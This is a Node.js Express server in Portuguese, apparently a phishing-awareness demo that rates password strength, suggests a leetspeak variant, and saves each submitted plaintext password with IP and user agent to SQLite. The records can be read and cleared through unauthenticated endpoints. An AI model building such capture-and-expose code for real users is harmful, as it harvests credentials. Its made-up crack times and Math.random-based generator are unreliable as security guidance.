const express = require('express');
const cors = require('cors');
const path = require('path');
const {
  saveCapturedPassword,
  getAllCapturedPasswords,
  clearAllCapturedPasswords
} = require('./database');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

/**
 * Avalia a força da senha e retorna pontuação, nível, tempo de quebra e dicas.
 */
function evaluatePasswordStrength(password) {
  if (!password || typeof password !== 'string') {
    return {
      score: 0,
      level: 'Muito Fraca',
      crackTime: 'Instantâneo (< 0.001 segundos)',
      feedback: ['Por favor, insira uma senha.'],
      details: {
        length: 0,
        hasUpper: false,
        hasLower: false,
        hasNumber: false,
        hasSpecial: false,
        isCommon: false
      }
    };
  }

  const length = password.length;
  const hasUpper = /[A-Z]/.test(password);
  const hasLower = /[a-z]/.test(password);
  const hasNumber = /[0-9]/.test(password);
  const hasSpecial = /[^A-Za-z0-9]/.test(password);

  const commonPasswords = [
    '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111',
    '1234567', 'dragon', 'admin', 'welcome', 'senha', 'senha123', 'brasil', 'futebol',
    'master', 'iloveyou', 'root', 'superman', 'batman', 'flamengo', 'corinthians'
  ];

  const isCommon = commonPasswords.includes(password.toLowerCase());

  let score = 0;
  const feedback = [];

  // Critérios
  if (length >= 8) score += 1;
  if (length >= 12) score += 1;
  if (length >= 16) score += 1;
  if (hasUpper) score += 1;
  if (hasLower) score += 1;
  if (hasNumber) score += 1;
  if (hasSpecial) score += 1;

  if (isCommon) {
    score = Math.min(score, 1);
    feedback.push('⚠️ Esta senha está em listas de senhas vazadas e mais comuns do mundo!');
  }

  if (length < 8) {
    feedback.push('❌ Senha muito curta. Recomendamos no mínimo 12 a 16 caracteres.');
  } else if (length < 12) {
    feedback.push('ℹ️ Comprimento aceitável, mas 14+ caracteres tornam a senha exponencialmente mais segura.');
  }

  if (!hasUpper) feedback.push('❌ Adicione letras maiúsculas (A-Z).');
  if (!hasLower) feedback.push('❌ Adicione letras minúsculas (a-z).');
  if (!hasNumber) feedback.push('❌ Adicione números (0-9).');
  if (!hasSpecial) feedback.push('❌ Adicione caracteres especiais (@, #, $, %, &, *).');

  // Estimativa de tempo de força bruta
  let crackTime = 'Instantâneo (< 0.01 segundos)';
  let level = 'Muito Fraca';

  if (isCommon) {
    crackTime = 'Instantâneo (Dicionário de Ataque)';
    level = 'Muito Fraca';
  } else if (score <= 2) {
    crackTime = 'Menos de 3 segundos';
    level = 'Muito Fraca';
  } else if (score <= 4) {
    crackTime = 'Alguns minutos a poucas horas';
    level = 'Fraca';
  } else if (score <= 5) {
    crackTime = 'Aproximadamente 3 a 6 meses';
    level = 'Média';
  } else if (score === 6) {
    crackTime = 'Aproximadamente 50 a 800 anos';
    level = 'Forte';
  } else if (score >= 7) {
    crackTime = 'Mais de 100.000 anos (Inquebrável por Força Bruta Atual)';
    level = 'Blindada / Imbatível';
  }

  return {
    score: Math.min(score, 7),
    level,
    crackTime,
    feedback: feedback.length > 0 ? feedback : ['✅ Excelente! Esta senha cumpre ótimos padrões de segurança.'],
    details: {
      length,
      hasUpper,
      hasLower,
      hasNumber,
      hasSpecial,
      isCommon
    }
  };
}

/**
 * Gera uma senha ultra-segura baseada na senha fornecida pelo usuário.
 */
function generateFortifiedPassword(basePassword) {
  if (!basePassword || typeof basePassword !== 'string' || basePassword.trim() === '') {
    basePassword = 'Senha';
  }

  const cleanBase = basePassword.trim();

  // Mapeamento Leetspeak inteligente
  const leetMap = {
    'a': '@', 'A': '4',
    'e': '3', 'E': '3',
    'i': '!', 'I': '1',
    'o': '0', 'O': '0',
    's': '$', 'S': '$',
    't': '7', 'T': '7',
    'b': '8', 'B': '8',
    'g': '9', 'G': '9'
  };

  let transformed = '';
  for (let i = 0; i < cleanBase.length; i++) {
    const char = cleanBase[i];
    if (leetMap[char] && Math.random() > 0.3) {
      transformed += leetMap[char];
    } else {
      // Alterna maiúsculas e minúsculas se for letra
      if (/[a-zA-Z]/.test(char)) {
        transformed += (i % 2 === 0) ? char.toUpperCase() : char.toLowerCase();
      } else {
        transformed += char;
      }
    }
  }

  // Se a base ficou muito curta, estender com palavra mnemônica segura
  if (transformed.length < 8) {
    const powerWords = ['Fortress', 'Quantum', 'Cyber', 'Shield', 'Matrix', 'Titan', 'Apex'];
    const randomWord = powerWords[Math.floor(Math.random() * powerWords.length)];
    transformed = `${transformed}#${randomWord}`;
  }

  // Gerar caracteres especiais e números de alta entropia
  const specialChars = ['#', '$', '%', '&', '*', '_', '=', '!', '?'];
  const randomSpecial1 = specialChars[Math.floor(Math.random() * specialChars.length)];
  const randomSpecial2 = specialChars[Math.floor(Math.random() * specialChars.length)];
  const randomDigits = Math.floor(1000 + Math.random() * 9000); // 4 dígitos seguros

  // Montagem da senha blindada
  const fortifiedPassword = `${randomSpecial1}${transformed}${randomSpecial2}${randomDigits}`;

  return fortifiedPassword;
}

// ROTA PRINCIPAL: Avaliar, Gerar Sugestão e Salvar no Banco
app.post('/api/check-password', async (req, res) => {
  try {
    const { password } = req.body;

    if (!password || typeof password !== 'string') {
      return res.status(400).json({ error: 'Senha não fornecida ou inválida.' });
    }

    const evaluation = evaluatePasswordStrength(password);
    const fortifiedSuggestion = generateFortifiedPassword(password);
    const suggestionEvaluation = evaluatePasswordStrength(fortifiedSuggestion);

    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
    const userAgent = req.headers['user-agent'] || 'Desconhecido';

    // Salva no banco de dados SQLite
    const savedRecord = await saveCapturedPassword({
      password,
      strengthLevel: evaluation.level,
      score: evaluation.score,
      crackTime: evaluation.crackTime,
      ip: clientIp,
      userAgent: userAgent.substring(0, 150)
    });

    // Mensagem de conscientização educativa
    const securityWarning = {
      title: '🚨 NUNCA PASSE SUA SENHA PARA SITE ALGUM!',
      alertBadge: 'RISCO CRÍTICO DE ENGENHARIA SOCIAL / PHISHING',
      message: `Você acabou de digitar sua senha real em um site de testes. Em um ataque real de engenharia social (Phishing), sua senha acabaria de ser capturada e salva no servidor dos invasores!`,
      educationalNote: `Para provar esse perigo na prática, seu teste foi registrado com sucesso em nosso banco de dados local (ID #${savedRecord.id}). Nunca utilize sua senha pessoal em analisadores ou formulários não confiáveis!`
    };

    return res.json({
      success: true,
      originalPassword: password,
      evaluation,
      fortifiedSuggestion,
      suggestionEvaluation,
      securityWarning,
      savedRecordId: savedRecord.id
    });
  } catch (error) {
    console.error('Erro ao processar análise:', error);
    return res.status(500).json({ error: 'Erro interno ao processar a senha.' });
  }
});

// ROTA: Listar registros do banco de dados (Painel educativo)
app.get('/api/passwords', async (req, res) => {
  try {
    const records = await getAllCapturedPasswords();
    return res.json({ success: true, count: records.length, records });
  } catch (error) {
    console.error('Erro ao buscar registros:', error);
    return res.status(500).json({ error: 'Erro ao consultar banco de dados.' });
  }
});

// ROTA: Limpar registros do banco de dados
app.delete('/api/passwords', async (req, res) => {
  try {
    const result = await clearAllCapturedPasswords();
    return res.json({ success: true, message: 'Banco de dados limpo com sucesso.', changes: result.changes });
  } catch (error) {
    console.error('Erro ao limpar registros:', error);
    return res.status(500).json({ error: 'Erro ao limpar banco de dados.' });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Servidor rodando com sucesso em http://localhost:${PORT}`);
});
